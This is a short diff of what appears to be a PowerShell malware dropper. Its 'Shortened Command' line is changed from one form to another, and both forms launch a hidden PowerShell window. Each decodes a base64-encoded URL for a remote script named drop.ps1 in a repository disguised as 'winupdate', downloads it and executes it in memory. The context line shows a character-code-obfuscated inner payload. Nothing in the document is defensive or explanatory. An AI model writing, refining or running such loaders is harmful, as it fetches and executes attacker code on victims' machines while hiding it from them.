@@ -3,4 +3,4 @@ $inner = '$k=1869; $h=@(1829,1849,1849,1853,1854,1911,1890,1890,1855,1836,1850,1
 
 
 #Shortened Command:
-powershell -w 1 -c "$b='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2d3eW4xODY5L3dpbnVwZGF0ZS9tYWluL2Ryb3AucHMx';$u=[Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($b));$p=@{Uri=$u};$d=irm @p;.([scriptblock]::Create($d))"
+powershell -w 1 -c "start-process powershell -arg '-w 1 -c $b=''aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2d3eW4xODY5L3dpbnVwZGF0ZS9tYWluL2Ryb3AucHMx'';iex(irm([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($b))))' -WindowStyle Hidden"
